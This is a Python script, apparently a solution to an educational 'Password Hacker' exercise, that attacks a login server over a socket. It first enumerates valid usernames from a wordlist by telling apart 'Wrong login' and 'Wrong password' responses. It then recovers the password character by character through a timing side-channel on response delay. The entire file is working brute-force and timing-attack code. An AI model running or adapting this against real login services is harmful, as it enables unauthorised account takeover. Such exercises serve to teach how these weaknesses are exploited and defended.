# write your code here
import sys
import socket
import string
import json
import datetime

WRONG_LOGIN = {"result": "Wrong login!"}
WRONG_PASSWORD = {"result": "Wrong password!"}
SERVER_EXCEPTION = {"result": "Exception happened during login"}
CONNECTION_SUCCESS = {"result": "Connection success!"}
symbols = string.ascii_letters + string.digits


args = sys.argv  # getting list of arguments
host = args[1]
port = int(args[2])
login = ""
with socket.socket() as client_socket:
    client_socket.connect((host, port))
    with open('C:\\Users\\Tatiana\\PycharmProjects\\Password Hacker\\Password Hacker\\task\\hacking\\logins.txt',
              'r') as logins_file:
        find_login = False
        while not find_login:
            lgn = logins_file.readline()[:-1]
            user_dict = {"login": lgn, "password": " "}
            question = bytes(json.dumps(user_dict), encoding='utf-8')
            client_socket.send(question)
            response = client_socket.recv(1024)
            if json.loads(response) == WRONG_PASSWORD:
                find_login = True
                login = lgn
                break
    find_password = False
    prefix = ''
    while not find_password:
        for smb in symbols:
            user_dict = {"login": login, "password": prefix + smb}
            question = bytes(json.dumps(user_dict), encoding='utf-8')
            client_socket.send(question)
            start = datetime.datetime.now()
            response = client_socket.recv(1024)
            finish = datetime.datetime.now()
            difference = finish - start
            if difference.microseconds > 100000:
                prefix += smb
                break
            if json.loads(response) == CONNECTION_SUCCESS:
                find_password = True
                break
    print(json.dumps(user_dict))
